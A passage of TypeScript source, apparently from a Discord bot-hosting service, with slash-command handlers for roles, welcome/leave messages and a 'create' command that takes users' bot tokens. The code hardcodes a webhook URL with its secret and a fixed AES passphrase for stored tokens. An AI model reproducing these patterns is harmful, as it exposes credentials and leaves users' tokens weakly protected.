          if(interaction.commandName === 'auto-role')
              {
                      const role = interaction.options.getRole('role');
                  
                      if(!role)
                          {
                              await interaction.reply("Invalid Role");
                              return;
                          }
                  let member = interaction.member;
                  if(!member.permissions.has("MANAGE_GUILD"))
                      {
                          await interaction.reply({content: "You Dont have permission to set role", ephemeral: true});
                          return;
                      }
                     let reoli = new MessageEmbed()
          .setDescription(`Successfully Saved, ${role.id} will be Provided When Someone Join this Server!`)
          .setColor('GREEM');
                   db.set(`roleaj_${interaction.guild.id}`, role.id);
                  await interaction.reply({embeds: [reoli], ephemeral: true});
              }
             if(interaction.commandName === 'welcome')
                {
                    await interaction.deferReply({ ephemeral: true });
                     if (!interaction.options)
      {
          await interaction.editReply({content: "You have to give message and channel\n Types are -- image-enable, disable, image-disable without an type you can set Channel and message e.g - .welcome #channel {user} Joined this server \n Message Modules are -- user, server and memberscount\n Example - {user} Just Joined {server} Now Total Members are {memberscount}\n Command Usage - /welcome image enable #welcome-channel {user} Just Joined This Server\n Disabling Command Usage - /welcome default disable #any-channel any message here", ephemeral: true})
            return;
      }
                    let option = interaction.options.getString('option')
                    let module = interaction.options.getString('enable-or-disable')
                    
        if(option === "image" && module === "disable")
            {
          db.delete(`joinimg_${interaction.guild.id}`);
                
               
            }
        if(option === "image" && module === "enable")
            {
                
             db.set(`joinimg_${interaction.guild.id}`, "yes");
               
            }
       if(option != "image" && module === "disable")
           {
                db.delete(`joinchan_${interaction.guild.id}`);
        db.delete(`joinmsg_${interaction.guild.id}`);
               
                
           }
            if(option != "image" && module != "disable" && module != "enable")
                {
                    await interaction.editReply({content: "Invalid Option or Module Given\n Give ", ephemeral: true});
               return;
                }
        var channel = interaction.options.getChannel('channel');
        if(channel)
            {
                   db.set(`joinchan_${interaction.guild.id}`, channel.id);
            }
            var message = interaction.options.getString('message');
            if(message)
            {
                db.set(`joinmsg_${interaction.guild.id}`, message);
            }
        
     
     
        await interaction.editReply({content: `Successfully Saved your Settings`, ephemeral: true});
                }
               if(interaction.commandName === 'leave')
                {
                    await interaction.deferReply({ ephemeral: true });
                     if (!interaction.options)
      {
          await interaction.editReply({content: "You have to give message and channel\n Types are -- image-enable, disable, image-disable without an type you can set Channel and message e.g - .leave #channel {user} Left this server \n Message Modules are -- user, server and memberscount\n Example - {user} Just Left {server} Now Total Members are {memberscount}\n Command Usage - /leave image enable #leave-channel {user} Just Left This Server\n Disabling Command Usage - /leave default disable #any-channel any message here", ephemeral: true})
            return;
      }
                    
                   let option = interaction.options.getString('option')
                    let module = interaction.options.getString('enable-or-disable')
                    
        if(option === "image" && module === "disable")
            {
          db.delete(`levimg_${interaction.guild.id}`);
                
               
            }
        if(option === "image" && module === "enable")
            {
                
             db.set(`levimg_${interaction.guild.id}`, "yes");
               
            }
       if(option != "image" && module === "disable")
           {
                 db.delete(`levchan_${interaction.guild.id}`);
        db.delete(`levmsg_${interaction.guild.id}`);
               } else {
               await interaction.editReply({content: "Invalid Option or Module Given", ephemeral: true});
               return;
           }
        var channel = interaction.options.getChannel('channel');
        if(channel)
            {
                   db.set(`levchan_${interaction.guild.id}`, channel.id);
            }
            var message = interaction.options.getString('message');
            if(message)
            {
                db.set(`levmsg_${interaction.guild.id}`, message);
            }
        
     
     
        await interaction.editReply({content: `Successfully Saved Your Settings`, ephemeral: true});
                }
       
                 
		         if(interaction.commandName === 'create')
               {
                    await interaction.deferReply({ephemeral: true});
                    let token = interaction.options.getString('token');
      // await getOrCreate({ token });
        if(!token)
            {
            await interaction.editReply({content:"Provide Your Bot Token", ephemeral: true}); 
                return;
            }
               
           const commandsxd = [];
       const authUser = interaction.user;
                   try {
     var botxd = await this.startBot(token)

     } catch (error)
         {
             await interaction.editReply({content: "Bot Token Invalid or Your bot's Server members Intent is disabled Please enable it or read this guide - https://gist.github.com/advaith1/e69bcc1cdd6d0087322734451f15aa2f ", ephemeral: true});
             return;
         }
                    
                           /*ctx.c("Give Your Bot Servers Members Intent and Presence Intent or Your Bot Token is Invalid/ Doesn't Exist"); */
                       
              
        // const botxd = await this.startBot(token);
                       
        if(!botxd)
            {
                   let embed17 = new MessageEmbed()
          .setDescription(`Invalid Bot Token or Your Bot's Servers Member Intent is Disabled, Contact [Support](https://discord.gg/b8UXVfXcmE)`)
          .setColor('RED');
            await interaction.editReply({embeds: [embed17], ephemeral: true });
                return;
            }
        const savedBot = await this.bots.get(botxd.user);
       
        const exists = await this.bots.exists(botxd.user);
        if (!exists) {
            savedBot.id = botxd.user.id;
            savedBot.ownerId = authUser.id;
        } else {
          await interaction.reply({content: "Bot Already Exists", ephemeral: true });
            return;
        }
        savedBot.tokenHash = AES.encrypt(token, "JKGNFDNBIOFNBOGN") as any;
        await savedBot.save();
      var rest = new REST({ version: '9' }).setToken(token);
const readdir = promisify(fs.readdir);
    
    const directory = resolve(`./src/commands`);
        const files = await readdir(directory);
        
        for (const file of files) {            
            const { default: Command } = await import(`../commands/${file}`);
            if (!Command) continue;
            
            const command = new Command();

          
         if(command.options && command.options[0])
         {
 
var data = new SlashCommandBuilder()
	.setName(command.name)
	.setDescription(command.summary)
	 switch (command.options[0]) {
        case "String":
            data.addStringOption(option => 
              option.setName(command.optionsname[0])
			.setDescription('Description Not Available')
			.setRequired(true));
            break;
        case "Channel":
            data.addChannelOption(option => 
              option.setName(command.optionsname[0])
			.setDescription('Description Not Available')
			.setRequired(true));
            break;
                      case "User":
            data.addUserOption(option => 
              option.setName(command.optionsname[0])
			.setDescription('Description Not Available')
			.setRequired(true));
            break;
                      case "Role":
            data.addRoleOption(option => 
              option.setName(command.optionsname[0])
			.setDescription('Description Not Available')
			.setRequired(true));
            break;
        default:
    }
   
    if(command.options[1])
        {
            switch (command.options[1]) {
        case "String":
            data.addStringOption(option => 
              option.setName(command.optionsname[1])
			.setDescription('Description Not Available')
			.setRequired(true));
            break;
        case "Channel":
            data.addChannelOption(option => 
              option.setName(command.optionsname[1])
			.setDescription('Description Not Available')
			.setRequired(true));
            break;
                      case "User":
            data.addUserOption(option => 
              option.setName(command.optionsname[1])
			.setDescription('Description Not Available')
			.setRequired(true));
            break;
                      case "Role":
            data.addRoleOption(option => 
              option.setName(command.optionsname[1])
			.setDescription('Description Not Available')
			.setRequired(true));
            break;
        default:
    }
        }
               if(command.options && command.options[2])
        {
             switch (command.options[2]) {
        case "String":
            data.addStringOption(option => 
              option.setName(command.optionsname[2])
			.setDescription('Description Not Available')
			.setRequired(true));
            break;
        case "Channel":
            data.addChannelOption(option => 
              option.setName(command.optionsname[2])
			.setDescription('Description Not Available')
			.setRequired(true));
            break;
                      case "User":
            data.addUserOption(option => 
              option.setName(command.optionsname[2])
			.setDescription('Description Not Available')
			.setRequired(true));
            break;
                      case "Role":
            data.addRoleOption(option => 
              option.setName(command.optionsname[2])
			.setDescription('Description Not Available')
			.setRequired(true));
            break;
        default:
    }
            
        } 
              if(command.options && command.options[3])
        {
             switch (command.options[3]) {
        case "String":
            data.addStringOption(option => 
              option.setName(command.optionsname[3])
			.setDescription('Description Not Available')
			.setRequired(true));
            break;
        case "Channel":
            data.addChannelOption(option => 
              option.setName(command.optionsname[3])
			.setDescription('Description Not Available')
			.setRequired(true));
            break;
                      case "User":
            data.addUserOption(option => 
              option.setName(command.optionsname[3])
			.setDescription('Description Not Available')
			.setRequired(true));
            break;
                      case "Role":
            data.addRoleOption(option => 
              option.setName(command.optionsname[3])
			.setDescription('Description Not Available')
			.setRequired(true));
            break;
        default:
    }
            
        }
              if(command.options && command.options[4])
        {
             switch (command.options[4]) {
        case "String":
            data.addStringOption(option => 
              option.setName(command.optionsname[4])
			.setDescription('Description Not Available')
			.setRequired(true));
            break;
        case "Channel":
            data.addChannelOption(option => 
              option.setName(command.optionsname[4])
			.setDescription('Description Not Available')
			.setRequired(true));
            break;
                      case "User":
            data.addUserOption(option => 
              option.setName(command.optionsname[4])
			.setDescription('Description Not Available')
			.setRequired(true));
            break;
                      case "Role":
            data.addRoleOption(option => 
              option.setName(command.optionsname[4])
			.setDescription('Description Not Available')
                          
			.setRequired(true));
            break;
        default:
    }
            
        } 
                   if(command.options && command.options[5])
        {
             switch (command.options[5]) {
        case "String":
            data.addStringOption(option => 
              option.setName(command.optionsname[5])
			.setDescription('Description Not Available')
			.setRequired(true));
            break;
        case "Channel":
            data.addChannelOption(option => 
              option.setName(command.optionsname[5])
			.setDescription('Description Not Available')
			.setRequired(true));
            break;
                      case "User":
            data.addUserOption(option => 
              option.setName(command.optionsname[5])
			.setDescription('Description Not Available')
			.setRequired(true));
            break;
                      case "Role":
            data.addRoleOption(option => 
              option.setName(command.optionsname[5])
			.setDescription('Description Not Available')
                          
			.setRequired(true));
            break;
        default:
    }
            
        } 
                   if(command.options && command.options[6])
        {
             switch (command.options[6]) {
        case "String":
            data.addStringOption(option => 
              option.setName(command.optionsname[6])
			.setDescription('Description Not Available')
			.setRequired(true));
            break;
        case "Channel":
            data.addChannelOption(option => 
              option.setName(command.optionsname[6])
			.setDescription('Description Not Available')
			.setRequired(true));
            break;
                      case "User":
            data.addUserOption(option => 
              option.setName(command.optionsname[6])
			.setDescription('Description Not Available')
			.setRequired(true));
            break;
                      case "Role":
            data.addRoleOption(option => 
              option.setName(command.optionsname[6])
			.setDescription('Description Not Available')
                          
			.setRequired(true));
            break;
        default:
    }
            
        } 
             

}
          else {
             var data = new SlashCommandBuilder()
        .setName(command.name)
	.setDescription(command.summary)
         }
          
         
            
       commandsxd.push(data);
        }
            var Hook = new webhook.Webhook("https://discord.com/api/webhooks/885892065207144468/gJzPQNHJ2qR_IKEKvH6u_DqQGJjqQM2wYBZJNPpFc1PwXUF5uW0iAbvIXcNZVrzNSKDf");
              var msgxd = new webhook.MessageBuilder()
              .setName("Logger")
               .setText(`New Bot Created ${botxd.user.tag} By ${interaction.member.user.tag}`);
                  Hook.send(msgxd);
	try {
		console.log('Started refreshing application (/) commands.');

		await rest.put(
			Routes.applicationCommands(botxd.user.id),
	{ body: commandsxd },
		);

		console.log('Successfully reloaded application (/) commands.');
         var msgxdxd = new webhook.MessageBuilder()
              .setName("Logger")
               .setText(`Slash Commands Registered of ${botxd.user.tag}`);
        Hook.send(msgxdxd)
	} catch (error) {
		console.error(error);
	}
                      let done = new MessageEmbed()
          .setDescription(`Successfully Created \n Prefix for your bot is \`.\` \n Registering Slash Command will take Few Minutes `)
          .setColor('GREEN');

        await interaction.editReply({embeds: [done], ephemeral: true });
               } 
          if(interaction.commandName === "say")
              {
                  let message = interaction.options.getString('sentence');
                  let channel = interaction.options.getChannel('channel');
                  channel.send(message);
                  await interaction.reply({content: "Successfully Sent Your Message To Your Given Channel", ephemeral: true})
              }
          
});
// const slash = new Slash(bot);

      /*  bot.on('ready',  () => {
          
         slash.command({
        guildOnly: false,
        guildID: "GUILD_ID",
        data: {
            name: "invite",
            description: "Get Invite of This Bot",
            type: 5,
            content: `https://discord.com/api/oauth2/authorize?client_id=${bot.user.id}&permissions=8&scope=applications.commands%20bot`
        }
    }) 
        
  
    }) */
    
        await bot.login(token);
       
        console.log(bot.user.id);
        for (const handler of this.handlers.slice(1))
            bot.on(handler.on as any, handler.invoke.bind(handler));

        return bot;
             
    }
      private async displayWarning(position: number, savedMember: MemberDocument, channel) {
        if (position <= 0 || position > savedMember.warnings.length)
            channel.send('------Complete------');

        const warning = savedMember.warnings[position - 1];
      
        channel.send(`**Warning #${position}**\n**By**: <@!${warning.instigatorId}>\n**For**: \`${warning.reason}\``);
    }
      getAvatar(user, format) {
    return user.displayAvatarURL({
      dynamic: true,
      size: 4096,
      format: format,
    });
  }
}